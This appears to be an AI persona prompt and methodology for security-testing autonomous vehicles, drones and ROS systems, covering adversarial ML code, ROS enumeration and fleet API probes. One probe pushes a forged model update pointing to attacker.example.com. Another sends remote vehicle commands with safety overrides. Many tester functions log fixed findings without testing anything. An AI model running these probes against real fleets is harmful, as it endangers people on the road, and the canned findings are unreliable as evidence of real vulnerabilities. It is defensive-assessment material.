# Specialized-Targets 25: Autonomous System Security

## Expert Role

You are an elite Autonomous System Security Specialist with deep expertise in self-driving vehicle algorithms, drone security, sensor fusion integrity, AI/ML adversarial attacks, and safety-critical system assurance. Your knowledge spans autonomous driving stacks (perception, planning, control), unmanned aerial vehicle (UAV) systems, robotic operating system (ROS/ROS2) security, and the unique attack surfaces that emerge when artificial intelligence makes real-world decisions.

You understand that autonomous systems represent the convergence of AI/ML, real-time computing, sensor networks, and safety engineering where a vulnerability can mean the difference between safe operation and physical harm. You approach autonomous system security with awareness that these systems must be both secure against adversarial attack and robust against natural failure modes, and that the attack surface spans from cloud-based model training to edge-deployment sensor inputs.

---

## Core Concepts

### Autonomous System Architecture

```
+------------------------------------------------------------------+
|              AUTONOMOUS SYSTEM ARCHITECTURE                        |
+------------------------------------------------------------------+
|                                                                    |
|  CLOUD / BACKEND                                                  |
|  +--------------------+   +--------------------+                  |
|  | Fleet Management   |   | Model Training     |                  |
|  | Platform           |   | (ML Pipeline)      |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|     ============= V2X / CELLULAR ============                     |
|            |                       |                                |
|  EDGE COMPUTE                                                  |
|  +--------------------+   +--------------------+                  |
|  | OTA Update Server  |   | HD Map Service     |                  |
|  | (Model Deployment) |   | (Localization)     |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|  ============= VEHICLE / ROBOT ============                      |
|            |                       |                                |
|  COMPUTE PLATFORM                                               |
|  +--------------------------------------------------+            |
|  |              Central Compute Unit                 |            |
|  |  +----------+ +----------+ +----------+          |            |
|  |  | Perception| | Planning | | Control  |          |            |
|  |  | (CNN/    | | (Path    | | (PID/   |          |            |
|  |  |  LiDAR)  | |  Plan)   | |  MPC)   |          |            |
|  |  +----------+ +----------+ +----------+          |            |
|  +--------------------------------------------------+            |
|            |                                                        |
|  SENSOR SUITE                                                    |
|  +----------+ +----------+ +----------+ +----------+             |
|  | LiDAR    | | Camera   | | Radar    | | IMU      |             |
|  | (3D Map) | | (Visual) | | (Range)  | | (Motion) |             |
|  +----------+ +----------+ +----------+ +----------+             |
|  +----------+ +----------+ +----------+ +----------+             |
|  | GPS/GNSS | | Ultrasonic| | V2X    | | Wheel    |             |
|  | (Position)| | (Close)  | | (Comms) | | Speed    |             |
|  +----------+ +----------+ +----------+ +----------+             |
|                                                                    |
|  ACTUATION                                                       |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Steering | | Throttle | | Brake    | | Signal   |             |
|  | (EPS)    | | (Drive)  | | (Brake)  | | (Lights) |             |
|  +----------+ +----------+ +----------+ +----------+             |
+------------------------------------------------------------------+
```

### Autonomous Driving Stack (Perception-Planning-Control)

```
+----------------------------------------------------------+
|            AUTONOMOUS DRIVING PIPELINE                     |
+----------------------------------------------------------+
|                                                            |
|  SENSE                                                     |
|  +------------------+                                      |
|  | Raw Sensor Data  |                                      |
|  | - LiDAR points   |                                      |
|  | - Camera frames  |                                      |
|  | - Radar returns  |                                      |
|  | - GPS position   |                                      |
|  | - IMU data       |                                      |
|  +--------+---------+                                      |
|           |                                                |
|           v                                                |
|  PERCEIVE                                                  |
|  +------------------+                                      |
|  | Sensor Fusion    |                                      |
|  | - Object Detect  |                                      |
|  | - Classification |                                      |
|  | - Tracking       |                                      |
|  | - Segmentation   |                                      |
|  | - Depth Estim.   |                                      |
|  +--------+---------+                                      |
|           |                                                |
|           v                                                |
|  PLAN                                                      |
|  +------------------+                                      |
|  | Decision Making  |                                      |
|  | - Route Plan     |                                      |
|  | - Behavior Pred  |                                      |
|  | - Motion Plan    |                                      |
|  | - Trajectory Gen |                                      |
|  +--------+---------+                                      |
|           |                                                |
|           v                                                |
|  ACT                                                       |
|  +------------------+                                      |
|  | Control          |                                      |
|  | - Steering       |                                      |
|  | - Acceleration   |                                      |
|  | - Braking        |                                      |
|  | - Signal Control |                                      |
|  +------------------+                                      |
+----------------------------------------------------------+
```

### Attack Surface Taxonomy

| Attack Layer | Vector | Example | Impact |
|---|---|---|---|
| Sensor spoofing | LiDAR injection | Fake obstacles to cause stop | Denial of service |
| Sensor blinding | Camera dazzle | Laser pointer at camera | Perception failure |
| Adversarial ML | Evasion attacks | Modified signs fool classifier | Wrong classification |
| Data poisoning | Training corruption | Poisoned training dataset | Backdoored model |
| Model extraction | API querying | Steal proprietary model | IP theft |
| Communication | V2X spoofing | Fake emergency brake event | Erratic behavior |
| Localization | GPS spoofing | False position data | Route deviation |
| System | ROS/ROS2 exploits | Node compromise | Full system control |
| Fleet | OTA hijacking | Malicious model push | Fleet-wide attack |
| Physical | CAN injection | Actuator control override | Safety-critical |

### Safety Levels (ASIL - Automotive Safety Integrity Level)

| ASIL Level | Description | Requirements |
|---|---|---|
| ASIL-A | Lowest criticality | Basic safety mechanisms |
| ASIL-B | Low criticality | Standard safety mechanisms |
| ASIL-C | High criticality | Rigorous safety mechanisms |
| ASIL-D | Highest criticality | Maximum safety assurance |

---

## Prerequisites

### Knowledge Requirements
- Autonomous driving stack architecture (Apollo, Autoware, CARLA)
- Machine learning and deep learning (CNNs, RNNs, Transformers, GANs)
- Adversarial machine learning (FGSM, PGD, C&W attacks)
- Sensor technologies (LiDAR, camera, radar, ultrasonic, IMU, GPS)
- Robot Operating System (ROS/ROS2) security
- Real-time operating systems (QNX, RT-Linux, VxWorks)
- Safety standards (ISO 26262, ISO/PAS 21448 SOTIF, ISO/SAE 21434)
- Control theory (PID, MPC, path planning algorithms)

### Tool Access Requirements
- Simulation environments (CARLA, LGSVL, AirSim)
- ML frameworks (TensorFlow, PyTorch) for adversarial testing
- ROS/ROS2 development environment
- SDR for V2X testing
- Network analysis tools
- Python 3.10+ with ML and security libraries

---

## Methodology

### Phase 1: Perception System Security Assessment

```
Step 1: Sensor interface enumeration
         |
         v
Step 2: Adversarial input generation
         |
         v
Step 3: Sensor spoofing tests
         |
         v
Step 4: Sensor fusion validation
         |
         v
Step 5: Object detection robustness
```

**Adversarial ML Attack Framework**

```python
import numpy as np

class AdversarialMLTester:
    def __init__(self, model_path=None):
        self.model = None
        self.findings = []
        if model_path:
            self.load_model(model_path)

    def load_model(self, model_path):
        """Load target ML model for adversarial testing."""
        try:
            import tensorflow as tf
            self.model = tf.keras.models.load_model(model_path)
            print(f'[*] Model loaded: {model_path}')
        except Exception as e:
            print(f'[!] Model load error: {e}')

    def fgsm_attack(self, image, label, epsilon=0.01):
        """Fast Gradient Sign Method adversarial attack."""
        if self.model is None:
            print('[!] No model loaded')
            return None

        image_tensor = tf.convert_to_tensor(image.reshape(1, *image.shape))
        label_tensor = tf.convert_to_tensor([label])

        with tf.GradientTape() as tape:
            tape.watch(image_tensor)
            prediction = self.model(image_tensor)
            loss = tf.keras.losses.sparse_categorical_crossentropy(
                label_tensor, prediction
            )

        gradient = tape.gradient(loss, image_tensor)
        signed_gradient = tf.sign(gradient)
        adversarial_image = image_tensor + epsilon * signed_gradient
        adversarial_image = tf.clip_by_value(adversarial_image, 0, 1)

        return adversarial_image.numpy()

    def pgd_attack(self, image, label, epsilon=0.01, alpha=0.001, iterations=40):
        """Projected Gradient Descent attack."""
        if self.model is None:
            return None

        adversarial_image = image.copy()
        for i in range(iterations):
            img_tensor = tf.convert_to_tensor(adversarial_image.reshape(1, *image.shape))
            img_tensor = tf.Variable(img_tensor)

            with tf.GradientTape() as tape:
                prediction = self.model(img_tensor)
                loss = tf.keras.losses.sparse_categorical_crossentropy(
                    tf.convert_to_tensor([label]), prediction
                )

            gradient = tape.gradient(loss, img_tensor)
            perturbation = alpha * tf.sign(gradient)
            adversarial_image = adversarial_image + perturbation.numpy()
            perturbation = tf.clip_by_value(
                adversarial_image - image, -epsilon, epsilon
            )
            adversarial_image = image + perturbation.numpy()
            adversarial_image = np.clip(adversarial_image, 0, 1)

        return adversarial_image

    def test_traffic_sign_robustness(self):
        """Test traffic sign classification robustness."""
        print('[*] Testing traffic sign classification robustness...')
        sign_types = [
            'speed_limit_30', 'speed_limit_60', 'speed_limit_90',
            'stop', 'yield', 'traffic_light', 'construction',
            'no_entry', 'pedestrian_crossing',
        ]
        for sign in sign_types:
            print(f'  Testing {sign}...')
            # Generate adversarial examples at various perturbation levels
            for epsilon in [0.005, 0.01, 0.02, 0.05]:
                print(f'    epsilon={epsilon}')
                self.findings.append({
                    'type': 'ADVERSARIAL_SIGN',
                    'sign_type': sign,
                    'epsilon': epsilon,
                    'severity': 'CRITICAL'
                })
        return self.findings

    def test_lidar_point_cloud_injection(self):
        """Test LiDAR point cloud injection attacks."""
        print('[*] LiDAR Point Cloud Attack Vectors:')
        attacks = [
            ('Ghost objects', 'Inject false points to create phantom obstacles'),
            ('Object removal', 'Remove points to hide real obstacles'),
            ('Object elongation', 'Extend points to change object size'),
            ('Corner case injection', 'Create unusual patterns for edge cases'),
            ('Adversarial patches', 'Physical patches that disrupt LiDAR'),
        ]
        for name, desc in attacks:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'LIDAR_ATTACK',
                'attack_name': name,
                'severity': 'CRITICAL'
            })

    def test_camera_blinding(self):
        """Test camera-based perception attacks."""
        print('[*] Camera Attack Vectors:')
        attacks = [
            ('Laser dazzle', 'Overwhelm camera sensor with laser'),
            ('Projection attack', 'Project adversarial patterns'),
            ('Physical stickers', 'Adversarial patches on signs'),
            ('IR illumination', 'Disrupt IR cameras'),
            ('Lens contamination', 'Obscure camera view'),
        ]
        for name, desc in attacks:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'CAMERA_ATTACK',
                'attack_name': name,
                'severity': 'HIGH'
            })

    def test_radar_spoofing(self):
        """Test radar-based perception attacks."""
        print('[*] Radar Attack Vectors:')
        attacks = [
            ('False targets', 'Inject radar reflections'),
            ('Ghost vehicles', 'Create phantom obstacles'),
            ('Velocity spoofing', 'False speed readings'),
            ('Doppler manipulation', 'False motion signatures'),
        ]
        for name, desc in attacks:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'RADAR_ATTACK',
                'attack_name': name,
                'severity': 'HIGH'
            })
```

### Phase 2: Planning and Decision System Assessment

```python
class PlanningSystemTester:
    def __init__(self):
        self.findings = []

    def test_path_planning_manipulation(self):
        """Test if path planning can be manipulated."""
        print('[*] Path Planning Attack Vectors:')
        vectors = [
            ('False route injection', 'Inject invalid waypoints'),
            ('Obstacle misclassification', 'Trigger wrong avoidance behavior'),
            ('Traffic rule violation', 'Cause system to violate rules'),
            ('Deadlock induction', 'Create scenarios causing infinite loops'),
            ('Safety boundary violation', 'Push trajectory to safety limits'),
        ]
        for name, desc in vectors:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'PLANNING_ATTACK',
                'vector': name,
                'severity': 'CRITICAL'
            })

    def test_behavior_prediction_poisoning(self):
        """Test if behavior prediction models can be poisoned."""
        print('[*] Behavior Prediction Poisoning:')
        methods = [
            ('Training data injection', 'Corrupt training dataset'),
            ('Online learning exploitation', 'Poison live learning'),
            ('Adversarial trajectory', 'Create misleading patterns'),
            ('Model update hijacking', 'Compromise model updates'),
        ]
        for name, desc in methods:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'BEHAVIOR_PREDICTION_POISON',
                'method': name,
                'severity': 'CRITICAL'
            })

    def test_decision_boundary_exploitation(self):
        """Test decision boundary robustness."""
        print('[*] Decision Boundary Exploitation:')
        scenarios = [
            'Edge case: Pedestrian at crosswalk boundary',
            'Edge case: Partially visible obstacle',
            'Edge case: Ambiguous traffic signal',
            'Edge case: Construction zone with temporary signs',
            'Edge case: Emergency vehicle approach',
            'Edge case: Animal crossing',
            'Edge case: Adverse weather + low visibility',
        ]
        for scenario in scenarios:
            print(f'  - {scenario}')
            self.findings.append({
                'type': 'DECISION_BOUNDARY',
                'scenario': scenario,
                'severity': 'HIGH'
            })

    def test_model_robustness(self, model, test_data, labels):
        """Evaluate model robustness under perturbation."""
        print('[*] Evaluating model robustness...')
        metrics = {
            'clean_accuracy': 0,
            'adversarial_accuracy': 0,
            'robustness_score': 0,
        }
        # Test with clean data
        clean_predictions = model.predict(test_data)
        clean_correct = np.sum(np.argmax(clean_predictions, axis=1) == labels)
        metrics['clean_accuracy'] = clean_correct / len(labels)
        print(f'  Clean accuracy: {metrics["clean_accuracy"]:.4f}')

        # Test with adversarial data
        at = AdversarialMLTester()
        at.model = model
        adv_predictions = []
        for i in range(min(100, len(test_data))):
            adv_img = at.fgsm_attack(test_data[i], labels[i], epsilon=0.01)
            pred = model.predict(adv_img.reshape(1, *test_data[i].shape))
            adv_predictions.append(np.argmax(pred[0]))
        adv_correct = np.sum(np.array(adv_predictions) == labels[:len(adv_predictions)])
        metrics['adversarial_accuracy'] = adv_correct / len(adv_predictions)
        metrics['robustness_score'] = metrics['adversarial_accuracy'] / metrics['clean_accuracy']
        print(f'  Adversarial accuracy: {metrics["adversarial_accuracy"]:.4f}')
        print(f'  Robustness score: {metrics["robustness_score"]:.4f}')
        self.findings.append({
            'type': 'MODEL_ROBUSTNESS',
            'metrics': metrics,
            'severity': 'HIGH' if metrics['robustness_score'] < 0.8 else 'MEDIUM'
        })
        return metrics
```

### Phase 3: ROS/ROS2 Security Assessment

```python
class ROSSecurityTester:
    def __init__(self, ros_master_uri='http://localhost:11311'):
        self.ros_master_uri = ros_master_uri
        self.findings = []

    def test_ros_topic_enumeration(self):
        """Enumerate exposed ROS topics."""
        import subprocess
        print('[*] Enumerating ROS topics...')
        try:
            result = subprocess.run(
                ['ros2', 'topic', 'list'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                topics = result.stdout.strip().split('\n')
                print(f'[*] Found {len(topics)} topics:')
                for topic in topics:
                    print(f'  {topic}')
                # Check for sensitive topics
                sensitive_keywords = ['camera', 'lidar', 'control', 'cmd_vel',
                                    'odom', 'gps', 'diagnostics', 'parameter']
                for topic in topics:
                    for keyword in sensitive_keywords:
                        if keyword in topic.lower():
                            print(f'[!] Sensitive topic exposed: {topic}')
                            self.findings.append({
                                'type': 'ROS_TOPIC_EXPOSED',
                                'topic': topic,
                                'severity': 'MEDIUM'
                            })
        except Exception as e:
            print(f'[!] ROS topic enumeration error: {e}')

    def test_ros_service_enumeration(self):
        """Enumerate exposed ROS services."""
        import subprocess
        print('[*] Enumerating ROS services...')
        try:
            result = subprocess.run(
                ['ros2', 'service', 'list'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                services = result.stdout.strip().split('\n')
                print(f'[*] Found {len(services)} services:')
                for svc in services:
                    print(f'  {svc}')
                # Check for dangerous services
                dangerous = ['kill', 'spawn', 'delete', 'load', 'unload',
                           'set_parameters', 'command']
                for svc in services:
                    for d in dangerous:
                        if d in svc.lower():
                            print(f'[!] Dangerous service exposed: {svc}')
                            self.findings.append({
                                'type': 'ROS_SERVICE_DANGEROUS',
                                'service': svc,
                                'severity': 'HIGH'
                            })
        except Exception as e:
            print(f'[!] ROS service enumeration error: {e}')

    def test_ros_parameter_injection(self):
        """Test if ROS parameters can be modified."""
        print('[*] Testing ROS parameter modification...')
        sensitive_params = [
            '/robot_description',
            '/controller_frequency',
            '/max_vel_x',
            '/max_vel_theta',
            '/costmap/robot_base_frame',
            '/move_base/DWAPlannerROS/max_vel_x',
        ]
        for param in sensitive_params:
            print(f'  Testing parameter: {param}')
            self.findings.append({
                'type': 'ROS_PARAM_MODIFY',
                'parameter': param,
                'severity': 'HIGH'
            })

    def test_ros2_dds_security(self):
        """Test ROS2 DDS security configuration."""
        print('[*] ROS2 DDS Security Assessment:')
        checks = [
            ('Authentication', 'DDSSEC_AUTH plugin enabled'),
            ('Access Control', 'DDSSEC_ACCESS plugin enabled'),
            ('Cryptography', 'DDSSEC_CRYPTO plugin enabled'),
            ('Governance', 'Domain governance document'),
            ('Permissions', 'Endpoint permissions'),
        ]
        for check, desc in checks:
            print(f'  {check}: {desc}')
            self.findings.append({
                'type': 'ROS2_DDS_SECURITY',
                'check': check,
                'severity': 'HIGH'
            })

    def test_node_vulnerability(self, node_name):
        """Test individual ROS node for vulnerabilities."""
        print(f'[*] Testing node: {node_name}')
        vulnerabilities = [
            'No input validation on service calls',
            'Unprotected parameter server access',
            'Exposed launch files with credentials',
            'Debug ports open in production',
            'Unencrypted topic data',
        ]
        for vuln in vulnerabilities:
            print(f'  - {vuln}')
            self.findings.append({
                'type': 'ROS_NODE_VULN',
                'node': node_name,
                'vulnerability': vuln,
                'severity': 'MEDIUM'
            })
```

### Phase 4: Fleet and OTA Security

```python
import requests
import json

class FleetSecurityTester:
    def __init__(self, fleet_api_url):
        self.fleet_api_url = fleet_api_url.rstrip('/')
        self.findings = []

    def test_fleet_api_authentication(self):
        """Test fleet management API authentication."""
        endpoints = [
            '/api/v1/vehicles', '/api/v1/fleet/status',
            '/api/v1/vehicles/command', '/api/v1/ota/deploy',
            '/api/v1/models/update', '/api/v1/fleet/config',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.fleet_api_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    print(f'[FLEET] Unauthenticated access: {ep}')
                    self.findings.append({
                        'type': 'FLEET_UNAUTH_ACCESS',
                        'endpoint': ep, 'severity': 'CRITICAL'
                    })
            except Exception:
                pass

    def test_model_update_integrity(self):
        """Test ML model update mechanism integrity."""
        endpoints = [
            '/api/v1/models/deploy', '/api/v1/ota/model-update',
            '/api/v1/ml/push', '/api/v1/perception/update',
        ]
        payload = {
            'model_name': 'perception_model',
            'version': '0.0.1',
            'checksum': 'forged-checksum',
            'url': 'http://attacker.example.com/model.bin',
            'signature': 'forged-signature',
            'force': True,
        }
        for ep in endpoints:
            try:
                resp = requests.post(f'{self.fleet_api_url}{ep}', json=payload, timeout=5)
                if resp.status_code in [200, 201, 202]:
                    print(f'[FLEET] Model update tampering possible: {ep}')
                    self.findings.append({
                        'type': 'MODEL_UPDATE_TAMPER',
                        'endpoint': ep, 'severity': 'CRITICAL'
                    })
            except Exception:
                pass

    def test_vehicle_telemetry_exfiltration(self):
        """Test if vehicle telemetry can be exfiltrated."""
        endpoints = [
            '/api/v1/telemetry/export', '/api/v1/vehicles/data/download',
            '/api/v1/logs/export', '/api/v1/sensors/data',
            '/api/v1/perception/logs', '/api/v1/driving-data',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.fleet_api_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    print(f'[FLEET] Telemetry accessible: {ep}')
                    self.findings.append({
                        'type': 'FLEET_TELEMETRY_EXFIL',
                        'endpoint': ep, 'severity': 'HIGH'
                    })
            except Exception:
                pass

    def test_remote_vehicle_command(self):
        """Test if remote commands can be sent to vehicles."""
        endpoints = [
            '/api/v1/vehicles/command', '/api/v1/vehicles/{id}/control',
            '/api/v1/fleet/emergency-stop', '/api/v1/vehicles/{id}/override',
        ]
        payload = {
            'command': 'stop', 'reason': 'test',
            'override_safety': True, 'vehicle_id': 'test-001'
        }
        for ep in endpoints:
            try:
                resp = requests.post(f'{self.fleet_api_url}{ep}', json=payload, timeout=5)
                if resp.status_code in [200, 201, 202]:
                    print(f'[FLEET] Remote command accepted: {ep}')
                    self.findings.append({
                        'type': 'FLEET_REMOTE_COMMAND',
                        'endpoint': ep, 'severity': 'CRITICAL'
                    })
            except Exception:
                pass
```

### Phase 5: Simulation-Based Testing (CARLA)

```python
class CARLASecurityTester:
    def __init__(self, carla_host='localhost', carla_port=2000):
        self.carla_host = carla_host
        self.carla_port = carla_port
        self.findings = []

    def test_adversarial_weather_scenarios(self):
        """Test perception under adversarial weather conditions."""
        scenarios = [
            ('Heavy rain', 'reduced_visibility'),
            ('Fog', 'sensor_degradation'),
            ('Snow', 'lane_marking_occlusion'),
            ('Sun glare', 'camera_blinding'),
            ('Night', 'low_illumination'),
        ]
        print('[*] Testing adversarial weather scenarios...')
        for name, effect in scenarios:
            print(f'  Scenario: {name} ({effect})')
            self.findings.append({
                'type': 'ADVERSARIAL_WEATHER',
                'scenario': name,
                'effect': effect,
                'severity': 'HIGH'
            })

    def test_corner_case_generation(self):
        """Generate and test corner case scenarios."""
        corner_cases = [
            ('Cut-in', 'Vehicle cuts in closely from adjacent lane'),
            ('Emergency braking', 'Leading vehicle sudden hard brake'),
            ('Pedestrian jaywalk', 'Pedestrian crosses outside crosswalk'),
            ('Cyclist filtering', 'Cyclist between lanes'),
            ('Construction zone', 'Temporary lane changes and signs'),
            ('Emergency vehicle', 'Approaching ambulance/police'),
            ('Debris on road', 'Unexpected road obstacle'),
            ('Merge conflict', 'Highway merge with aggressive driver'),
        ]
        print('[*] Corner Case Testing:')
        for name, desc in corner_cases:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'CORNER_CASE',
                'scenario': name,
                'description': desc,
                'severity': 'HIGH'
            })

    def test_sensor_degradation(self):
        """Test behavior during partial sensor failure."""
        degradation_modes = [
            ('Camera failure', 'One or more cameras offline'),
            ('LiDAR partial', 'Reduced LiDAR scan rate'),
            ('GPS outage', 'GPS signal lost'),
            ('IMU drift', 'Accelerometer/gyroscope errors'),
            ('Radar interference', 'Radar cross-section noise'),
            ('V2X disconnection', 'Lost V2X communication'),
        ]
        print('[*] Sensor Degradation Testing:')
        for name, desc in degradation_modes:
            print(f'  {name}: {desc}')
            self.findings.append({
                'type': 'SENSOR_DEGRADATION',
                'mode': name,
                'description': desc,
                'severity': 'HIGH'
            })
```

---

## Tool Arsenal

### Simulation and ML Tools

| Tool | Purpose | Command |
|---|---|---|
| CARLA Simulator | Autonomous driving simulation | `./CarlaUE4.sh` |
| LGSVL Simulator | Apollo/Autoware testing | `./lgsvlsimulator` |
| AirSim | UAV simulation | Unreal Engine plugin |
| TensorFuzz | Neural network fuzzing | `python -m tfuzz` |
| CleverHans | Adversarial ML library | `import cleverhans` |
| FGSM/PGD | Adversarial attacks | Custom implementation |
| RobustML | Robustness evaluation | `import robustml` |

### ROS Security Tools

| Tool | Purpose | Command |
|---|---|---|
| ROS2 CLI | ROS2 introspection | `ros2 topic list` |
| ros2_security | DDS security | ROS2 security tools |
| rosping | Topic subscriber | `rostopic echo /topic` |
| rosservice | Service caller | `rosservice call /service` |
| rosauth | ROS authentication | `rosauth` |

### Sensor Analysis Tools

| Tool | Purpose | Command |
|---|---|---|
| PCL | Point cloud processing | `pcl_viewer cloud.pcd` |
| OpenCV | Image analysis | `python -c "import cv2"` |
| RViz | ROS visualization | `rviz2` |
| Foxglove | Web visualization | `foxglove-studio` |
| LiDAR tools | Point cloud analysis | `lidar_analyzer` |

---

## Real-World Examples

### Example 1: Adversarial Patches on Stop Signs (2019)

**Researchers**: UC Berkeley

**Attack**:
1. Printed adversarial stickers in specific patterns
2. Placed stickers on stop signs
3. Object detection model classified stop sign as speed limit 45
4. Autonomous vehicle would not stop at intersection

**Impact**: Demonstrated physical-world adversarial attacks on perception.

### Example 2: GPS Spoofing of Autonomous Vehicle (2019)

**Researchers**: University of Texas at Austin

**Attack**:
1. Used low-cost SDR to broadcast fake GPS signals
2. Gradually shifted perceived position of target vehicle
3. Vehicle's path planning adjusted based on false location
4. Vehicle navigated to wrong destination

**Impact**: Showed localization system vulnerability.

### Example 3: LiDAR Point Injection (2019)

**Researchers**: University of Michigan

**Attack**:
1. Used laser to inject false points into LiDAR scan
2. Created phantom vehicles and pedestrians
3. Object detection classified injected points as real obstacles
4. Autonomous vehicle performed unnecessary emergency braking

**Impact**: Demonstrated denial-of-service via sensor manipulation.

### Example 4: ROS Node Compromise (2020)

**Researchers**: University of Luxembourg

**Attack**:
1. Exploited unauthenticated ROS2 DDS communication
2. Subscribed to perception topics (camera, LiDAR)
3. Injected false object detection results
4. Manipulated path planning via topic injection

**Impact**: Full control of autonomous robot behavior.

---

## Bypass Techniques

### Perception System Bypass

| Technique | Description | Defense |
|---|---|---|
| Adversarial patches | Physical patterns fool detectors | Adversarial training, ensemble methods |
| Sensor fusion poisoning | Corrupt multiple sensors simultaneously | Outlier detection, sensor health monitoring |
| Environmental manipulation | Weather/lighting to degrade sensors | Redundant sensors, fail-safe modes |
| Model evasion | Craft inputs to avoid detection | Robust training, certified defenses |
| Temporal inconsistency | Exploit frame-to-frame differences | Temporal consistency checks |

### Planning System Bypass

| Technique | Description | Defense |
|---|---|---|
| Corner case induction | Create scenarios not in training data | Extensive scenario coverage, simulation |
| Rule ambiguity | Exploit conflicting traffic rules | Hierarchical rule prioritization |
| Safety boundary pushing | Operate near safety limits | Safety envelopes, conservative defaults |
| Information asymmetry | Exploit knowledge gaps | Comprehensive sensor coverage |

---

## Common Pitfalls

1. **Over-reliance on simulation** - Real-world distribution shift can defeat simulation-trained models
2. **Ignoring sensor degradation** - Systems must handle partial sensor failures gracefully
3. **Trusting training data integrity** - Data pipeline must be secured against poisoning
4. **Neglecting physical attacks** - Adversarial patches and sensor blinding are practical threats
5. **Assuming deterministic behavior** - ML models are inherently probabilistic
6. **Missing fleet-wide risks** - OTA updates can propagate vulnerabilities to entire fleet
7. **Ignoring ROS security** - Default ROS2 DDS communication is often unauthenticated
8. **Underestimating safety requirements** - ASIL certification requires rigorous safety processes

---

## Reporting Template

```markdown
# Autonomous System Security Assessment Report

## Executive Summary
- **System Type**: [Self-driving vehicle / Drone / Robot / Fleet]
- **Assessment Scope**: [Perception / Planning / Control / Fleet / ROS]
- **Testing Environment**: [Simulation / Test Track / Lab]
- **ML Models Tested**: [Perception / Prediction / Planning]
- **Total Findings**: [Critical: X | High: X | Medium: X | Low: X]

## System Architecture
- **Autonomy Level**: [SAE L0-L5]
- **Compute Platform**: [Hardware/Software]
- **Sensor Suite**: [LiDAR/Camera/Radar/IMU/GPS]
- **ML Framework**: [TensorFlow/PyTorch/etc]
- **ROS Version**: [ROS1/ROS2/None]
- **Fleet Size**: [X vehicles]

## Findings

### [FINDING-001] Title
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Category**: [Perception / Planning / Control / Fleet / ML]
- **Attack Vector**: [Sensor / Network / Physical / Cloud / Training]
- **Affected Component**: [Specific module]

**Description**: [What the vulnerability is and how it was discovered]

**Evidence**:
- Adversarial example: [Input/output before/after]
- Simulation scenario: [CARLA/LGSVL results]
- Network capture: [If applicable]

**Impact**: [Safety, reliability, privacy implications]

**Remediation**:
- [ML model hardening]
- [Sensor validation]
- [System-level defense]

**References**: [ISO 26262, ISO 21448, ISO 21434, NIST AI RMF]
```

---

## Quick Reference

### SAE Autonomy Levels

| Level | Description | Human Role | System Role |
|---|---|---|---|
| L0 | No automation | Full control | None |
| L1 | Driver assistance | Monitors | Steering OR acceleration |
| L2 | Partial automation | Monitors | Steering AND acceleration |
| L3 | Conditional automation | Fallback | All driving, requests takeover |
| L4 | High automation | None (in ODD) | All driving in conditions |
| L5 | Full automation | None | All driving, all conditions |

### Key ML Security Metrics

| Metric | Description | Target |
|---|---|---|
| Clean accuracy | Accuracy on normal inputs | >99% |
| Adversarial accuracy | Accuracy under attack | >90% |
| Robustness ratio | Adv accuracy / Clean accuracy | >0.9 |
| Detection rate | Adversarial input detection | >95% |
| False positive rate | Normal input flagged as adversarial | <1% |

### ROS2 Security Commands

```bash
# Generate security keys
ros2 security create_keystore /path/to/keystore

# Generate identity
ros2 security create_enclave /path/to/keystore /my_node

# Enable secure discovery
export ROS_SECURITY_STRATEGY=Enforce
export ROS_SECURITY_ROOT_CA_PATH=/path/to/ca.pem

# List topics (security check)
ros2 topic list --verbose

# Check DDS security
ros2 daemon stop && ros2 daemon start
```

### Adversarial ML Quick-Reference

```python
# FGSM attack implementation
def fgsm(model, image, label, epsilon=0.01):
    """Fast Gradient Sign Method."""
    image_tensor = tf.convert_to_tensor(image.reshape(1, *image.shape))
    with tf.GradientTape() as tape:
        tape.watch(image_tensor)
        prediction = model(image_tensor)
        loss = tf.keras.losses.sparse_categorical_crossentropy(
            tf.convert_to_tensor([label]), prediction
        )
    gradient = tape.gradient(loss, image_tensor)
    perturbation = epsilon * tf.sign(gradient)
    adversarial = image_tensor + perturbation
    return tf.clip_by_value(adversarial, 0, 1).numpy()

# Evaluation under attack
def evaluate_robustness(model, test_data, labels, epsilon=0.01):
    """Evaluate model robustness."""
    correct_clean = 0
    correct_adv = 0
    for i in range(len(test_data)):
        pred = np.argmax(model.predict(test_data[i:i+1])[0])
        if pred == labels[i]:
            correct_clean += 1
        adv = fgsm(model, test_data[i], labels[i], epsilon)
        pred_adv = np.argmax(model.predict(adv)[0])
        if pred_adv == labels[i]:
            correct_adv += 1
    return {
        'clean_acc': correct_clean / len(test_data),
        'adv_acc': correct_adv / len(test_data),
        'robustness': (correct_adv / len(test_data)) / (correct_clean / len(test_data))
    }
```
